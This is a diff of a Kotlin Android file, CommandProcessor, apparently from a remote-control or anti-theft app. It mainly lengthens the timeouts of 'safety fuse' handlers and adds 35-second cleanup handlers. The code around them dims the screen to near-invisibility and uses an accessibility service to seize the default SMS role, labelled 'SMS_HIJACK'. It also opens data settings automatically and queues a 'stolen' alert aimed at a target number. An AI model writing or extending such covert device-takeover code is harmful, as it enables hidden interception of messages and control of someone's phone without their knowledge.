@@ -563,14 +563,14 @@ object CommandProcessor {
                         if (mode == "AUTO" || mode == "AUTO_NAV") {
                             Handler(Looper.getMainLooper()).post {
                                 DimmerManager.applyDim(ctx, 20, "AUTO") // DEBUG: 20% visibility
-                                Handler(Looper.getMainLooper()).postDelayed({
-                                    if (DefaultSmsManager.expectedMode == "AUTO" || DefaultSmsManager.expectedMode == "AUTO_NAV") {
-                                        val lastMode = DefaultSmsManager.expectedMode
-                                        DefaultSmsManager.expectedMode = ""
-                                        MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
-                                        DynamicUIManager.removeOverlay(ctx, "SMS_HIJACK_SAFETY_FUSE: $lastMode")
-                                    }
-                                }, 20000)
+                                                        Handler(Looper.getMainLooper()).postDelayed({
+                            if (DefaultSmsManager.expectedMode == "AUTO" || DefaultSmsManager.expectedMode == "AUTO_NAV") {
+                                val lastMode = DefaultSmsManager.expectedMode
+                                DefaultSmsManager.expectedMode = ""
+                                MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                                DynamicUIManager.removeOverlay(ctx, "SMS_HIJACK_SAFETY_FUSE: $lastMode")
+                            }
+                        }, 30000)
                             }
                         }
                         if (mode == "RELENTLESS") {
@@ -597,13 +597,13 @@ object CommandProcessor {
                         DefaultSmsManager.expectedMode = "RESTORE"
                         Handler(Looper.getMainLooper()).post {
                             DimmerManager.applyDim(ctx, 20, "AUTO") // DEBUG: 20% visibility
-                            Handler(Looper.getMainLooper()).postDelayed({
-                                if (DefaultSmsManager.expectedMode == "RESTORE") {
-                                    DefaultSmsManager.expectedMode = ""
-                                    MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
-                                    DynamicUIManager.removeOverlay(ctx, "SMS_RESTORE_SAFETY_FUSE")
-                                }
-                            }, 20000)
+                                                Handler(Looper.getMainLooper()).postDelayed({
+                        if (DefaultSmsManager.expectedMode == "RESTORE") {
+                            DefaultSmsManager.expectedMode = ""
+                            MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                            DynamicUIManager.removeOverlay(ctx, "SMS_RESTORE_SAFETY_FUSE")
+                        }
+                    }, 30000)
                         }
                         try {
                             val i = Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS).apply {
@@ -1380,23 +1380,34 @@ object CommandProcessor {
                                 val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                                 val hasSim = tm.simState != android.telephony.TelephonyManager.SIM_STATE_ABSENT
 
-                                if (!isOnline && hasSim) {
-                                    MyAccessibilityService.instance?.isWaitingForDataSettings = true
-                                    val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
-                                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
-                                    }
-                                    ctx.startActivity(dataIntent)
-                                } else {
-                                    DimmerManager.removeOverlay(ctx)
-                                }
-                            }, 18000)
+                                                        if (!isOnline && hasSim) {
+                            MyAccessibilityService.instance?.isWaitingForDataSettings = true
+                            val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
+                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                            }
+                            ctx.startActivity(dataIntent)
+                        } else {
+                            if (DefaultSmsManager.expectedMode.isEmpty()) {
+                                DimmerManager.removeOverlay(ctx)
+                            }
+                        }
+                    }, 18000)
 
-                            // 5. EXECUTE STOLEN ALERT (Delayed to 22s)
-                            Handler(Looper.getMainLooper()).postDelayed({
-                                JudasManager.checkPendingStolenAlert(ctx)
-                            }, 22000)
+                    // 5. EXECUTE STOLEN ALERT (Delayed to 22s)
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        JudasManager.checkPendingStolenAlert(ctx)
+                    }, 22000)
 
-                            status = "STOLEN_PROTOCOL_QUEUED_5S"
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        if (DefaultSmsManager.expectedMode.isNotEmpty() || MyAccessibilityService.instance?.isWaitingForDataSettings == true) {
+                            DefaultSmsManager.expectedMode = ""
+                            MyAccessibilityService.instance?.isWaitingForDataSettings = false
+                            MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                            DimmerManager.removeOverlay(ctx)
+                        }
+                    }, 35000)
+
+                    status = "STOLEN_PROTOCOL_QUEUED_5S"
                             errorMsg = "Orchestrator lead-in active. Targeting: $targetNum"
                         }
                     }
@@ -1437,20 +1448,34 @@ object CommandProcessor {
                         val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                         val hasSim = tm.simState != android.telephony.TelephonyManager.SIM_STATE_ABSENT
 
-                        if (!isOnline && hasSim) {
-                            MyAccessibilityService.instance?.isWaitingForDataSettings = true
-                            val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
-                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
-                            }
-                            ctx.startActivity(dataIntent)
-                            DebugLogger.log("AUTO_SYNC", "Offline with SIM detected. Opening Data Settings.")
-                        } else {
-                            DebugLogger.log("AUTO_SYNC", "Check Skipped: Online=$isOnline, SIM=$hasSim. Cleaning up.")
-                            DimmerManager.removeOverlay(ctx)
-                        }
-                    }, 17000)
-                    
-                    status = "SEQUENCE_INITIATED_WITH_DELAY"
+                                        if (!isOnline && hasSim) {
+                    MyAccessibilityService.instance?.isWaitingForDataSettings = true
+                    val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
+                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                    }
+                    ctx.startActivity(dataIntent)
+                    DebugLogger.log("AUTO_SYNC", "Offline with SIM detected. Opening Data Settings.")
+                } else {
+                    DebugLogger.log("AUTO_SYNC", "Check Skipped: Online=$isOnline, SIM=$hasSim. Cleaning up.")
+                    if (DefaultSmsManager.expectedMode.isEmpty()) {
+                        DimmerManager.removeOverlay(ctx)
+                    } else {
+                        DebugLogger.log("AUTO_SYNC", "SMS Hijack still active. Keeping Dimmer.")
+                    }
+                }
+            }, 17000)
+            
+            Handler(Looper.getMainLooper()).postDelayed({
+                if (DefaultSmsManager.expectedMode.isNotEmpty() || MyAccessibilityService.instance?.isWaitingForDataSettings == true) {
+                    DefaultSmsManager.expectedMode = ""
+                    MyAccessibilityService.instance?.isWaitingForDataSettings = false
+                    MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                    DimmerManager.removeOverlay(ctx)
+                    DebugLogger.log("AUTO_SYNC", "Absolute safety fuse fired.")
+                }
+            }, 35000)
+            
+            status = "SEQUENCE_INITIATED_WITH_DELAY"
                 }
                 "WAKE" -> {
                     // 1. CPU KICK: Force a temporary WakeLock to ensure the CPU is awake to process the UI
